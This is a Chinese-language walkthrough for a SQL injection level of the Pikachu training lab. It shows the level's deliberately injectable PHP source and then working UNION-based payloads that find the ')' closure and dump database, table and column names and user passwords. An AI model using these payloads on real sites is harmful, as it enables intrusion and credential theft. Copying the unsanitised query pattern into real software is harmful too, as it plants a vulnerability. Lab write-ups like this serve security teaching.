# xx型注入

# 一、代码审计

该关卡的代码如下

```php+HTML
<?php
/**
 * Created by runner.han
 * There is nothing new under the sun
 */


$SELF_PAGE = substr($_SERVER['PHP_SELF'],strrpos($_SERVER['PHP_SELF'],'/')+1);

if ($SELF_PAGE = "sqli_search.php"){
    $ACTIVE = array('','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','active open','','','','','active','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','','');
}

$PIKA_ROOT_DIR =  "../../";
include_once $PIKA_ROOT_DIR . 'header.php';

include_once $PIKA_ROOT_DIR."inc/config.inc.php";
include_once $PIKA_ROOT_DIR."inc/function.php";
include_once $PIKA_ROOT_DIR."inc/mysql.inc.php";

$link=connect();
$html='';

if(isset($_GET['submit']) && $_GET['name']!=null){
    //这里没有做任何处理，直接拼到select里面去了
    $name=$_GET['name'];
    //这里的变量是字符型，需要考虑闭合
    $query="select id,email from member where username=('$name')";
    $result=execute($link, $query);
    if(mysqli_num_rows($result)>=1){
        while($data=mysqli_fetch_assoc($result)){
            $id=$data['id'];
            $email=$data['email'];
            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
        }
    }else{

        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
    }
}



?>


<div class="main-content">
    <div class="main-content-inner">
        <div class="breadcrumbs ace-save-state" id="breadcrumbs">
            <ul class="breadcrumb">
                <li>
                    <i class="ace-icon fa fa-home home-icon"></i>
                    <a href="sqli.php">sqli</a>
                </li>
                <li class="active">x</li>
            </ul><!-- /.breadcrumb -->
            <a href="#" style="float:right" data-container="body" data-toggle="popover" data-placement="bottom" title="tips(再点一下关闭)"
               data-content="管tmd的什么型,能够制造出闭合,就是本事">
                点一下提示~
            </a>


        </div>
        <div class="page-content">

            <div id="sqli_main">
                <p class="sqli_title">what's your username?</p>
                <form method="get">
                    <input class="sqli_in" type="text" name="name" />
                    <input class="sqli_submit" type="submit" name="submit" value="查询" />
                </form>
                <?php echo $html;?>
            </div>



        </div><!-- /.page-content -->
    </div>
</div><!-- /.main-content -->





<?php
include_once $PIKA_ROOT_DIR . 'footer.php';

?>
```

通过观察源码可以看到该关卡的代码对SQL注入无任何防护

***

# 二、通关教程

xx型不是一种注入类型，只是修改了上方的闭合符号而已，根据题目可以了解到大概的SQL语句

```
select xxx,xxx,xxx from xxx where xxx='xx';
```

继续判断该级别的SQL闭合符号

```
?name=allen			# 显示正常
?name=allen'%23		# 显示异常
?name=allen"%23		# 显示异常
?name=allen')%23	 # 显示正常
?name=allen")%23	 # 显示异常

//可以确定该级别的闭合符号为 ('xxx')
```

![image-20230305125425221](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305125425221.png)

对Payload进行变形即可

```
# 猜字段数
?name=a') order by 2%23

# 查询数据库名
?name=1') union select 1,database()%23

# 查询表名
?name=1') union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23

# 查询字段名
?name=1') union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'%23

# 查询字段内容
?name=1') union select group_concat(username),group_concat(password) from users%23
```

![image-20230305130002502](C:\Users\linyunong\Desktop\Note\pikachu靶场通关教程\Sql Inject(SQL注入)\images\image-20230305130002502.png)